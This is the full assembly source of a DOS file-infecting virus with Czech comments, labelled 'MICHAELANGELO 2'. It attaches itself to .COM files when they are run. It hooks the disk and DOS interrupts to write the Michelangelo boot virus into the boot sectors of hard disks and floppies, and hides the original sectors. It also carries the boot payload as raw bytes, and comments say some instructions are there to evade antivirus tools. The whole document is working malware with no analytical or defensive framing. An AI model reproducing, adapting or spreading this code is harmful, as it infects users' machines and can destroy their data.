; ****************************************************************************
; *                                                                          *
; * Souborovy virus MICHAELANGELO 2, urceny k nainstalovani bootovaciho viru *
; * MICHAELANGELO a k samovolnemu mnozeni.  Pripisuje  se  pri spusteni .COM *
; * souboru. Jakmile se virus usadi v RAM , nejprve se pokusi napadnout boot *
; * sektor disku C:\, pak postupne napada vsechny media, ktere budou vlozena *
; * do pocitace (mysleno tim diskety).                                       *
; *                                                                          *
; ****************************************************************************

code    segment
    assume cs:code,ds:code

    org 100h

start:     jmp goto_vir

alt_adr:   mov ax,4C00h
       int 21h

tab_1      db 0E9h          ; instrukce JMP 1111
tab_2      dw 1111h
tab_3      dw 0AA03h            ; poznavaci znameni
alt_int13  dd ?             ; stary INT 13H
alt_int21  dd ?             ;       INT 21H
alt_int24  dd ?             ;       INT 24H
alt_attr   dw ?             ;       ATRIBUT SOUBORU
alt_date   dw ?             ;   DATUM SOUBORU
alt_time   dw ?             ;   CAS SOUBORU
diskik     db ?             ;   SEKTOR dle, toho na jakem
                    ; disku se zrovna pracuje(07h/0Eh)
eros       db 0             ; vznikla chyba ?


; **************    NOVY INT 13H    *****************



int13:     cmp ah,02                    ; je pozadavek na cteni ?
       jz jdi_tam                   ; ano, pokracuj
       cmp ah,04                    ; je pozadavek na veryfikaci ?
       jz jdi_tam                   ; ano, pokracuj

end13:     jmp dword ptr cs:[alt_int13-103h]

jdi_tam:   push bx
           push cx
           push dx
           push es
           push ds
           push si
           push di
       push ax

           push ax
       mov ah,0            ; vynuluj ukazatel chyby
       mov byte ptr cs:[eros-103h],ah  ; na adrese EROS
           mov ah,0Eh           ; 14 sektor urceny k ulozeni puv.
                    ; boot sektoru - pro diskety

           cmp dl,80h                   ; jedna se o harddisk ?
           jb disketa                   ; ne, skok na disketu
           mov ah,07h           ; 7 sektor pro harddisk
disketa:   mov byte ptr cs:[diskik-103h],ah ; uschovej tento sektor
       mov byte ptr cs:[begin_-103h+8],ah   ; dulezita informace pro
                        ; boot virus !!!
           mov ax,cs            ; uprava pro kontrolu a
           mov es,ax            ; prenosy
       mov ds,ax
           pop ax           ; uprava pro vir, vraceni

       mov ah,00            ; reset disku
       call pom_sko

       mov si,03            ; zkus cist 3 krat

pdeb1:     mov cl,1                     ; 1 sektor
           mov ah,02
       mov bx,offset pro_sek-103h   ; buffer pro Boot sektor
       call cti_sek         ; nacti Boot sektor disku(aktual.)
       mov byte ptr cs:[eros-103h],ah ; uloz identifikaci chyby
       jnc is_ok_           ; v poradku nacteno

       dec si
       jnz pdeb1            ; opakuj pokusy

       jmp vir_je           ; skok pri CHYBE disku
       
is_ok_:    mov si,offset begin_-103h+14     ; adresa viru + 14, coz je misto
                        ; kde je ulozen identifikator
                        ; bootviru MICHAELANGELO 2

       mov di,offset pro_sek-103h+14    ; adresa nacteneho Bootu + 14 

       mov cx,10            ; porovnavat 10 byte
       cld
       repe cmpsb
       je vir_je            ; vir je na disku pritomen

           mov bx,offset pro_sek-103h    ; adresa origin.boot sektoru
           mov cl,byte ptr cs:[diskik-103h] ; sektor, kam ho zapsat
           mov ah,03h                       ; zapis
           call cti_sek                     ; proved
           mov byte ptr cs:[eros-103h],ah
           jc vir_je                        ; je-li chyba nepokracuj


; Nyni je nutno upravit PARTITION TABLE

       xor bx,bx                ; finesa pro LEA
       mov di,offset pro_sek-103h       ; buffer s boot sektorem
       lea si,[bx+offset begin_-103h]   ; buffer s virem
       mov cx,01BEh             ; delka boot sektoru bez
                        ; PARTITION TABLE
       cld
       rep movsb                ; prenes

           mov bx,offset pro_sek-103h       ; adresa viru
           mov cl,01                        ; ktery sektor
           mov ah,03h                       ; zapis
           call cti_sek                     ; proved
           mov byte ptr cs:[eros-103h],ah   ; uloz identifikator chyby


vir_je:    pop ax           ; vraceni puvodnich registru
           pop di
           pop si
           pop ds
           pop es
           pop dx
           pop cx
           pop bx

           call pom_sko          ; provedeni puvodniho INT 13h

       push cx
           mov ch,byte ptr cs:[eros-103h] ; testovani, zda vznikla chyba
                      ; pri cteni boot sektoru, nebo
                      ; pri zapisu viru do bootu, proto-
                      ; ze, pak uz nema kryti viru 
                      ; vyznam
           cmp ch,00              
       pop cx
           jnz none

           pushf
           push ax
       push bx
       push cx
       push dx

           cmp cx,0001      ; testuj, necte-li 00 stopu a 01 sektor ?
           jnz nenito       ; ne necte, skoc

           cmp dh,00        ; cte povrch 00, ci-li boot sektor ?
           jnz nenito       ; ne necte, skoc

           mov cl,byte ptr cs:[diskik-103h] ; cislo sektoru(07h/0Eh)
           mov ah,02                ; fce cteni
           call cti_sek     ; precti puvodni boot sektor a posli jej
                ; na misto bufferu, odkud si jej zada DOS

nenito:    pop dx
       pop cx
       pop bx
       pop ax
           popf

none:      retf 2                       ; konec preruseni INT13


cti_sek:   mov al,01h           ; pocet nacitanych sektoru
           mov dh,00            ; povrch
       cmp cl,0Eh           ; testuje, zda se jedna o disketu
       jnz hardd

       mov dh,01            ; uprava pro disketu, SIDE = 1

hardd:     mov ch,00            ; cislo stopy

pom_sko:   pushf                ; finesa kvuli navratu
                        ; z preruseni
           call dword ptr cs:[alt_int13-103h]   ; skok na stary INT 13h
           ret              ; vrat se




; *************    NOVY INT 24H    ************


int24:     mov al,03
       iret



; *************    NOVY INT 21H    ************


int21:     cmp ax,4B00h   ; jde o spusteni programu ?
           jz skok1       ; ano, jdi do viru
           cmp ax,0AA03h  ; jde o identifikaci viru ?
           jnz skok2      ; ne, proved puvodni INT 21h

; nastaveni priznaku, ze uz jsem v pameti

           xchg ah,al     ; vrati hodnotu 03AAh, identifikace viru
           iret

; skok na puvodni INT 21h

skok2:     jmp dword ptr cs:[alt_int21-103h]

; vse O.K.

skok1:     push ax
           push bx
       NOP          ; NOPy kvuli utajeni pred TRI PSI
           push cx
           push dx
       nop
           push ds
           push es
    
       NOP

; uschova pro pouziti registru virem

           push dx
           push ds

; nastaveni datoveho segmentu

           mov ax,cs
           mov ds,ax

; cti adresu int 24h

       mov ax,3524h
       int 21h

       mov word ptr cs:[alt_int24-103h],bx
       mov word ptr cs:[alt_int24-103h+2],es

       mov dx,offset int24-103h
       mov ax,2524h
       int 21h

; cte attributy souboru

           pop ds                 ; obnova DS:DX=^jmeno
           pop dx
           mov ax,4300h
           int 21h
           jnc skok3              ; O.K. pokracuji
           jmp konec              ; chybne cteni - konec
skok3:     mov cs:[alt_attr-103h],cx   ; uschova attributu

; nastaveni attributu, ze neni READ_ONLY,SYSTEM ani HIDDEN

           and cx,0FFF8h
           mov ax,4301h
           int 21h
           jnc skok4              ; O.K.
           jmp konec              ; chyba - konec

skok4:     push dx                ; uschova ukazatele na jmeno souboru
           push ds

; otevreni souboru pro cteni a zapis

           mov ax,3D02h
           int 21h
           jnc skok5              ; O.K.
           jmp end_1              ; chyba - konec

; cteni data a casu vytvoreni souboru

skok5:     mov bx,ax
           mov ax,cs
           mov ds,ax
           mov ax,5700h
           int 21h
           jc end_2               ; chyba - konec

; uschova data a casu
           mov cs:[alt_date-103h],dx
           mov cs:[alt_time-103h],cx

; cte prvnich 5 byte ze souboru na svuj zacatek (adr. cs:alt_adr)

           mov dx,0000
           mov cx,0005
           mov ah,3Fh
           int 21h
           jc end_3               ; chyba - konec
           cmp ax,cx              ; nacten pozadovany pocet byte ?
           jc end_3               ; nenacten - konec
           mov ax,word ptr cs:[alt_adr-103h]
       cmp ax,5A4Dh           ; jde o EXE soubor ?
           jz end_3               ; je to EXE, tak konec
           mov ax,word ptr cs:[alt_adr-103h+3]
       cmp ax,0AA03h          ; test je-li soubor nakazen
           jz end_3               ; soubor uz nakazen

; nastav ukazatel souboru na jeho konec

           xor cx,cx
           xor dx,dx
           mov ax,4202h
           int 21h
           jc end_3               ; chyba - konec
           or dx,dx
           jnz end_3              ; soubor - 64kB - konec
           cmp ax,0EA60h
           jnc end_3              ; delka >= EA60h - konec

; vypocet nove startovaci adresy

           add ax,offset goto_vir-106h
           mov word ptr cs:[tab_2-103h],ax  ; uschova nove startovaci adresy

; pripsani viru k souboru

           xor dx,dx                    ; cs:dx=adresa dat
           mov cx,delka_viru            ; cx=pocet byte k zapisu
           mov ah,40h
           int 21h
           jc end_3                     ; chyba pri zapisu - konec
           cmp ax,cx
           jc end_3                     ; nebyl zapsan prislusny pocet byte

; nastav ukazatel souboru na jeho zacatek

           xor cx,cx
           xor dx,dx
           mov ax,4200h
           int 21h
           jc end_3                     ; chyba posunu konec

; zapis do souboru (prvnich 5 byte) =skok do viru

           mov dx,offset tab_1-103h       ; adresa dat
           mov cx,0005                    ; pocet byte
           mov ah,40h
           int 21h

; obnova data a casu vytvoreni souboru

end_3:     mov cx,word ptr cs:[alt_time-103h]        ; cas
           mov dx,word ptr cs:[alt_date-103h]        ; datum
           mov ax,5701h
           int 21h

; uzavri soubor

end_2:     mov ah,3Eh
           int 21h

; obnovi atributy souboru

end_1:     mov cx,word ptr cs:[alt_attr-103h]   ; atribut
           pop ds                               ; ds:dx=^jmeno
           pop dx
           mov ax,4301h
           int 21h

konec:     mov ax,word ptr cs:[alt_int24-103h+2]
       mov ds,ax
       mov dx,word ptr cs:[alt_int24-103h]
       mov ax,2524h
       int 21h
 
       pop es
           pop ds
           pop dx
           pop cx
           pop bx
           pop ax
           jmp skok2

;; **************** START VIRU **************

goto_vir:  push ax
           call na_sebe
na_sebe:   pop bx

; obnova prvnich 5 byte hostitele

           mov di,100h                  ; adresa cile prenosu

       NOP              ; utajeni pred ANTIVIRY

           lea si,[bx-rozskok]          ; adresa puvodnich dat (=0103h)
           mov cx,0005                  ; pocet byte presunu
           cld
           rep movsb

           push bx                      ; uschova offsetu
           mov ah,30h                   ; cti versi DOSu
           int 21h
           cmp al,03
           pop bx                       ; obnova zasobniku
           jc he_skok                   ; DOS 3.0 - konec

       NOP              ; utajeni pred ANTIVIRY

; test, jestli uz je vir v pameti

           mov ax,0AA03h                ; volani sluzby zjisteni pritomnosti
           int 21h
           cmp ax,03AAh

       NOP              ; utajeni pred ANTIVIRY

           stc  
           jz he_skok                   ; uz je vir v pameti - konec

; instalace do pameti

           mov ax,cs
           dec ax
           mov es,ax                    ; es:0=^MCB
           push bx

       NOP              ; utajeni pred ANTIVIRY

           mov bx,word ptr es:[0003]    ; bx=pocet paragrafu zabranych progra.
           cmp bx,2000h
he_skok:   jc endik                     ; zbyvajici pamet je mala, byl by
                                        ; napadny - konec

; zmensime zabrane pameti o 70 paragrafu

           sub bx,70h

       NOP              ; utajeni pred ANTIVIRY

           nop
           mov ax,cs
           mov es,ax                    ; segment alokovaneho bloku
           mov ax,4A00h
           int 21h                      ; modifikace bloku pameti
           pop bx
           jc endik                     ; chyba - konec
           push bx

; alokace pameti pro vir

           mov bx,006Fh                 ; pocet paragrafu
           nop
           mov ah,48h
           int 21h                      ; alokuj pamet

       NOP              ; utajeni pred ANTIVIRY

           pop bx
           jc endik                     ; chyba - konec

; uprava velikosti pouzitelne hostitelskym programem v PSP

           dec ax                       ; ukazatel pred vir
           db 0A3h,02,00                ; mov [0002],ax       
                    ; nastaveni mensiho MemTop v PSP

; nastaveni priznaku vlastnika pro pamet zabranou virem

           mov es,ax
           inc ax
           mov word ptr es:[0001],ax    ; vlastnik sam

; presun viru do zabrane oblasti pameti

           mov es,ax
           xor di,di                    ; nova adresa umisteni
           lea si,[bx-rozskok]          ; adresa zacatku viru
           mov cx,1+delka_viru/2        ; pocet slov pro presun
           cld
           rep movsw
           mov ds,ax                    ; uschova adresy kopie viru

; cteni adresy INT 13h a jeho uschova

           mov ax,3513h
           int 21h
           mov word ptr ds:[alt_int13-103h],bx
           mov word ptr ds:[alt_int13-103h+2],es

; cteni adresy INT 21h a jeho uschova

           mov ax,3521h
           int 21h
           mov word ptr ds:[alt_int21-103h],bx
           mov word ptr ds:[alt_int21-103h+2],es

; nastaveni novych adres INT 13h

          mov dx,offset int13-103h
          mov ax,2513h
          int 21h

; nastaveni novych adres INT 21h

          mov dx,offset int21-103h
          mov ax,2521h
          int 21h

; konec prace viru

endik:    mov ax,cs
          mov ds,ax                     ; obnova DS
          mov es,ax                     ; obnova ES
          pop ax                        ; obnova AX
          mov bx,0100h                  ; startovaci adresa .COM souboru
          push bx
          ret                           ; finesa pro skok na puvodni .COM

begin_  db  233,172,000,254,000,000,000,002,014,000,000,000,000,000,030,080
        db  010,210,117,027,051,192,142,216,246,006,063,004,001,117,016,088
        db  031,156,046,255,030,010,000,156,232,011,000,157,202,002,000,088
        db  031,046,255,046,010,000,080,083,081,082,030,006,086,087,014,031
        db  014,007,190,004,000,184,001,002,187,000,002,185,001,000,051,210
        db  156,255,030,010,000,115,012,051,192,156,255,030,010,000,078,117
        db  228,235,067,051,246,252,173,059,007,117,006,173,059,071,002,116
        db  053,184,001,003,182,001,177,003,128,127,021,253,116,002,177,014
        db  137,014,008,000,156,255,030,010,000,114,027,190,190,003,191,190
        db  001,185,033,000,252,243,165,184,001,003,051,219,185,001,000,051
        db  210,156,255,030,010,000,095,094,007,031,090,089,091,088,195,051
        db  192,142,216,250,142,208,184,000,124,139,224,144,251,030,080,144
        db  161,076,000,163,010,124,144,161,078,000,163,012,124,161,019,004
        db  144,072,072,163,019,004,177,006,144,211,224,142,192,163,005,124
        db  184,014,000,144,163,076,000,140,006,078,000,144,185,206,001,190
        db  000,124,051,255,252,144,243,164,144,046,255,046,003,124,051,192
        db  142,192,205,019,014,031,184,001,002,187,000,124,139,014,008,000
        db  131,249,007,117,008,186,128,000,144,205,019,235,045,139,014,008
        db  000,186,000,001,205,019,114,034,014,007,184,001,002,187,000,002
        db  185,001,000,144,186,128,000,205,019,114,015,051,246,252,173,144
        db  059,007,117,081,173,059,071,002,117,075,051,201,180,004,144,205
        db  026,128,250,001,116,001,203,051,210,185,001,000,184,009,003,139
        db  054,008,000,131,254,003,116,016,176,014,131,254,014,116,009,178
        db  128,198,006,007,000,004,176,017,187,000,080,144,142,195,205,019
        db  115,004,050,228,205,019,254,198,058,054,007,000,144,114,205,050
        db  246,254,197,235,199,185,007,000,137,014,008,000,144,184,001,003
        db  186,128,000,205,019,114,163,190,190,003,191,190,001,185,033,000
        db  243,165,144,184,001,003,051,219,254,193,205,019,235,140,000,000
        db  000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000
        db  000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000
        db  000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000
        db  000,000,000,000,000,000,000,000,000,000,000,000,000,000,085,170


pro_sek   db 0                          ; misto pro BOOT sektor

end_      db 16 dup (?)                 ; zaokrouhleni na cely paragraf

rozskok equ offset goto_vir-offset start+1
ldir    equ offset end_-offset begin_
konec_viru:
delka_viru equ konec_viru-start-3
code    ends
    end start
    